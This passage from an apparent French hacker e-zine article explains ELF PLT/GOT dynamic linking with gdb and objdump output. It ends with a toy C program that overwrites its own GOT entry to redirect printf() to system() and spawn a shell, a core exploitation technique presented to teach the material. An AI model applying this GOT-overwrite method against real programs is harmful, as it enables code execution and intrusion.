of assembler dump.<BR>(gdb) x 0x80494a8<BR>0x80494a8 &lt;_GLOBAL_OFFSET_TABLE_+24&gt;: 
0x08048312</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">La 
fonction main() contient un appel &agrave; la fonction printf(). En examinant 
le contenu de la m&eacute;moire &agrave; l'adresse indiqu&eacute;e (0x804830c, 
i.e. l'adresse de printf()), nous constatons que la premi&egrave;re instruction 
ex&eacute;cut&eacute;e est en fait un saut &agrave; une adresse contenue dans 
la section .got (Global Offset Table ou GOT). En simplifiant, cette GOT joue le 
r&ocirc;le d'index de la PLT : elle signale qu'il faut revenir dans la PLT en 
0x08048312, soit juste apr&egrave;s le saut. Ensuite, un autre saut rend l'ex&eacute;cution 
du programme au linker pour qu'il recherche l'adresse de la fonction dans la biblioth&egrave;que 
ad&eacute;quate.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Pr&eacute;cisons 
qu'il est tout &agrave; fait possible d'obtenir les m&ecirc;mes r&eacute;sultats 
avec la commande objdump :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">$ 
/usr/bin/objdump -T ./elf | grep printf<BR>0804830c DF *UND* 0000002f GLIBC_2.0 
printf<BR>$ /usr/bin/objdump -R ./elf | grep printf<BR>080494a8 R_386_JUMP_SLOT 
printf</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">La premi&egrave;re 
donne l'adresse de la PLT de la fonction printf(), et la seconde son entr&eacute;e 
dans le GOT.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Il 
faut bien comprendre ici le r&ocirc;le distinct de la PLT et de la GOT. La premi&egrave;re 
effectue une action : construire le lien entre une fonction requise dans le code 
du programme et le code machine associ&eacute; dans une biblioth&egrave;que. En 
quelque sorte, la PLT est un mini-&eacute;diteur de liens. D'ailleurs, tout comme 
la section .text qui contient les instructions du programme, la PLT est en lecture 
seule. De son c&ocirc;t&eacute;, la GOT, qui est en lecture/&eacute;criture, est 
un annuaire qui r&eacute;f&eacute;rence juste l'adresse d'une fonction (en toute 
rigueur, elle indexe &eacute;galement les variables globales d&eacute;finies dans 
les biblioth&egrave;ques et utilis&eacute;es dans le programme)</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Cette 
approche s'appelle lazy symbol binding (r&eacute;solution tardive des symboles). 
L'id&eacute;e est que si un programme utilise beaucoup de biblioth&egrave;ques 
dynamiques, l'&eacute;dition de liens est tr&egrave;s (trop) longue. Ainsi, celle-ci 
ne se fait que lorsqu'il y en a r&eacute;ellement besoin.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Il 
est possible de forcer la r&eacute;solution des symboles par l'&eacute;diteur 
de liens avec la variable d'environnement LD_BIND_NOW d&egrave;s l'appel du programme, 
et non plus lorsqu'un symbole est requis :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">$ 
export LD_BIND_NOW=1<BR>$ gdb ./elf<BR>[...]<BR>(gdb) b main<BR>Breakpoint 1 at 
0x80483e6<BR>(gdb) r<BR>Starting program: /home/zorgon/dev/articles/intro/./elf<BR>Breakpoint 
1, 0x80483e6 in main ()<BR>(gdb) disass printf<BR>Dump of assembler code for function 
printf:<BR>0x804830c : jmp *0x80494a8<BR>0x8048312 : push $0x18<BR>0x8048317 : 
jmp 0x80482cc &lt;_init+52&gt;<BR>End of assembler dump.<BR>(gdb) x 0x80494a8<BR>0x80494a8 
&lt;_GLOBAL_OFFSET_TABLE_+24&gt;: 0x40059d44<BR>(gdb) info symbol 0x40059d44<BR>printf 
in section .text<BR>(gdb)</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Cette 
fois, la r&eacute;solution est faite avant m&ecirc;me l'ex&eacute;cution de la 
fonction printf(). Nous remarquons que l'adresse contenue dans la GOT pointe maintenant 
dans la section .text o&ugrave; se trouvent les instructions de la fonction.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Alchimie 
avec les fonctions<BR>Pour illustrer ce m&eacute;canisme, nous montrons maintenant 
comment transformer l'appel d'une fonction en une autre &agrave; l'aide d'un petit 
programme tr&egrave;s simple :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">$ 
/bin/cat foobar.c<BR>#include &lt;stdio.h&gt;<BR>#include &lt;stdlib.h&gt;</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">int 
main( int argc, char * argv[] )<BR>{<BR> unsigned int got_addr = strtoul( argv[1], 
0, 16 );<BR> unsigned int value = strtoul( argv[2], 0, 16 );</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
* (int *) got_addr = value;<BR> printf( argv[3] );</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
return;<BR>}<BR>$ gcc foobar.c -o foobar</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Nous 
voulons que le programme foobar transforme l'appel de la fonction printf() en 
un appel &agrave; system() en allant modifier la GOT. Pour y parvenir, nous devons 
nous procurer deux informations : </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">l'adresse 
de printf() dans la GOT : <BR> $ /usr/bin/objdump -R ./foobar | grep printf<BR> 
08049518 R_386_JUMP_SLOT printf<BR> <BR>l'adresse de system() dans la libc : <BR> 
$ gdb ./foobar<BR> [...]<BR> (gdb) b main<BR> Breakpoint 1 at 0x8048426<BR> (gdb) 
r<BR> Starting program: /home/zorgon/dev/articles/intro/./foobar<BR> Breakpoint 
1, 0x8048426 in main ()<BR> (gdb) p system<BR> $1 = {&lt;text variable, no debug 
info&gt;} 0x4004e2f0 &lt;system&gt;<BR> </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>Ainsi, 
la PLT va chercher l'adresse de la fonction printf() en 0x08049518. Il nous suffit 
alors de remplacer le contenu de cette adresse par 0x4004e2f0 qui correspond &agrave; 
l'adresse de la fonction system() en m&eacute;moire, ce qui est r&eacute;alis&eacute; 
par l'instruction * (int *) got_addr = value; :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">$ 
./foobar 0x08049518 0x4004e2f0 /bin/sh<BR>sh-2.03$ </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><B><FONT COLOR="#FFFFFF">Conclusion</FONT></B><FONT COLOR="#FFFFFF"> 
: </FONT><BR>Nous avons pr&eacute;sent&eacute; ici diff&eacute;rentes notions 
relatives &agrave; l'ex&eacute;cution d'un programme. Chacune nous servira dans 
le prochain article o&ugrave; nous &eacute;tudierons de multiples solutions offertes 
sous Linux pour se pr&eacute;munir de l'ex&eacute;cution de shellcode r&eacute;sultant 
d'un d&eacute;bordement de buffer : Openwall, Stackguard, PaX, LibSafe. Nous d&eacute;taillerons 
les m&eacute;canismes mis en oeuvre par ces approches et les d&eacute;fenses qu'elles 
fournissent, mais nous en verrons &eacute;galement les limites.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">merci 
a : Fr&eacute;d&eacute;ric Raynal et Samuel Dralet.</FONT></P><P ALIGN="CENTER"><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR><B><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000">...::: 
SECURITY By</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"> A-bone <FONT COLOR="#FF0000">:::...</FONT></FONT></B></FONT></P><P ALIGN="LEFT"> 
<BR></P><P></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>===================================================================== 
<BR>The end :)</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Bon, 
sur ce, je termienrai par ce po&egrave;me d'un hacker anonyme : </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR><FONT COLOR="#00CC00" SIZE="1">010110100111 
<BR>101010100100 <BR>100011010111 <BR>110010101000 </FONT></FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">100010101111 
<BR>100010101110 <BR>001011011011 <BR>101100110010 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">101101010010 
<BR>010101011010 <BR>010111010011 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">101001010111 
<BR>010101001111 <BR>111010010111 </FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
</FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Visitez 
nos sites : <A HREF="http://dealer-hack.ifrance.com" TARGET="_blank">http://dealer-hack.ifrance.com</A> 
&amp; <A HREF="http://dealerhacksecurity.free.fr" TARGET="_blank">http://dealerhacksecurity.free.fr</A></FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Vous 
avez des questions a prepos du nos Mag's ? vous n'avez pas compris quelque chose 
allez sur le forum : <A HREF="http://dealerhacksecurity.free.fr/forum" TARGET="_blank">http://dealerhacksecurity.free.fr/forum</A><BR></FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><B>By</B></FONT> 
<B><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">TDC - The Darkunderground 
Clan</FONT></B><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> </FONT></P>
</BODY>
</HTML>
